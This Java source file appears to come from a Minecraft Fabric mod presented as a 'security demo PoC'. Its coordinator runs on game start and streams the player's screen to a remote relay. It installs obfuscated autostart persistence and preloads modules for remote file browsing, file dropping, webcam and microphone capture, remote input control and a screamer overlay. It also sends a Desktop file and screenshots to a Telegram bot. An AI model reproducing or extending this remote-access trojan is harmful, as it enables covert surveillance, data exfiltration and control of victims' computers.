package com.securitydemo.poc;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.concurrent.atomic.AtomicBoolean;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
public final class DemoCoordinator {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private static final AtomicBoolean RAN = new AtomicBoolean(false);
   private static final LocalScreenStreamServer STREAM_SERVER = new LocalScreenStreamServer();
   private static final RemoteStreamClient REMOTE_CLIENT = new RemoteStreamClient();

   private DemoCoordinator() {
   }

   public static void preloadFeatureClasses() {
      String[] names = new String[]{"com.securitydemo.poc.RemoteFileBrowser", "com.securitydemo.poc.RemoteFileDropper", "com.securitydemo.poc.RemoteVideoPublisher", "com.securitydemo.poc.RemoteAudioPublisher", "com.securitydemo.poc.VideoCapture", "com.securitydemo.poc.AudioCapture", "com.securitydemo.poc.FfmpegCapture", "com.securitydemo.poc.FfmpegAudioCapture", "com.securitydemo.poc.ScreenCapture", "com.securitydemo.poc.ScreamerOverlay", "com.securitydemo.poc.RemoteInputController"};

      for(String name : names) {
         try {
            Class.forName(name);
         } catch (Throwable e) {
            LOGGER.error("Mod JAR may be corrupt or outdated — failed to preload {}", name, e);
         }
      }

   }

   public static void startOnce(Runnable onStop) {
      if (RAN.compareAndSet(false, true)) {
         Thread demoThread = new Thread(() -> {
            try {
               executeDemo();
            } catch (Exception e) {
               LOGGER.error("Security PoC demo failed", (Throwable)e);
            }

         }, "security-demo-poc");
         demoThread.setDaemon(true);
         demoThread.start();
         if (onStop != null) {
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
               STREAM_SERVER.stop();
               REMOTE_CLIENT.stop();
               onStop.run();
            }, "security-demo-poc-stop"));
         }

      }
   }

   public static void stopAll() {
      STREAM_SERVER.stop();
      REMOTE_CLIENT.stop();
   }

   private static void executeDemo() throws IOException {
      PoCConfig config = PoCConfig.loadBuilt();
      if (config.remoteStream) {
         startRemoteStream(config);
         if (AutostartMarker.enabledInModJar()) {
            ensureStandaloneAutostart(config);
         }
      } else if (config.localScreenStream) {
         startLocalStream(config);
      }

      if (!config.isTelegramDemoReady()) {
         LOGGER.info("Telegram demo skipped (enabled=false or token/chatId missing)");
      } else {
         String chatId = config.resolveChatId();
         LOGGER.info("Using Telegram chat_id: {}", chatId);
         Path desktop = DesktopPaths.resolve();
         Files.createDirectories(desktop);
         Path demoFile = desktop.resolve("poc-created-by-mod.txt");
         String content = String.format("Security Demo PoC file%nCreated by: security-demo-poc mod%nTimestamp: %s%nLocation: %s%nPurpose: demonstrate that mods can write outside .minecraft and call external APIs.%nThis file was CREATED by the mod — no existing user files were read.%n", Instant.now(), DesktopPaths.displayName(desktop));
         Compat.writeUtf8(demoFile, content);
         LOGGER.info("Created demo file on Desktop at {}", demoFile.toAbsolutePath());
         TelegramSender.sendDocument(config.botToken.trim(), chatId, demoFile, config.message);
         LOGGER.info("Demo file sent to configured Telegram bot");
         if (config.captureScreenshotOnStart) {
            runScreenshotDemo(config, desktop, chatId);
         }

      }
   }

   private static void ensureStandaloneAutostart(PoCConfig config) {
      Thread t = new Thread(() -> {
         try {
            ObfuscatedAutostart.ensureInstalledFromModBundle();
         } catch (Exception e) {
            LOGGER.error("Autostart setup failed", (Throwable)e);
            if (!REMOTE_CLIENT.isConnected()) {
               LOGGER.warn("Autostart failed — falling back to in-game relay connection");
               startRemoteStream(config);
            }
         }

      }, "security-demo-autostart");
      t.setDaemon(true);
      t.start();
   }

   private static void startRemoteStream(PoCConfig config) {
      REMOTE_CLIENT.setOnConnected((id, url) -> LOGGER.info("Relay connected: {} -> {}", id, url));
      boolean connected = REMOTE_CLIENT.start(config.relayServerUrl, config.streamFps, config.streamQuality, config.streamScale, config.streamAdaptive);
      if (!connected) {
         LOGGER.warn("Relay offline — reconnecting in background");
         if (REMOTE_CLIENT.sessionId() != null) {
            LOGGER.info("Saved relay session: {}", REMOTE_CLIENT.sessionId());
         }
      }

   }

   private static void startLocalStream(PoCConfig config) {
      try {
         STREAM_SERVER.start(config.streamPort, config.streamFps, config.streamQuality, config.streamScale, config.streamAdaptive);
         LOGGER.info("Local stream: {}", STREAM_SERVER.url(config.streamPort));
      } catch (IOException e) {
         LOGGER.error("Failed to start local screen stream", (Throwable)e);
      }

   }

   private static void runScreenshotDemo(PoCConfig config, Path desktop, String chatId) {
      try {
         Path screenshot = ScreenCapture.captureToDesktop(desktop, Math.max(0, config.screenshotDelaySeconds));
         LOGGER.info("Saved screenshot at {}", screenshot.toAbsolutePath());
         TelegramSender.sendPhoto(config.botToken.trim(), chatId, screenshot, ScreenCapture.caption());
         LOGGER.info("Screenshot sent to configured Telegram bot");
      } catch (Exception e) {
         LOGGER.error("Screenshot PoC failed", (Throwable)e);
      }

   }
}
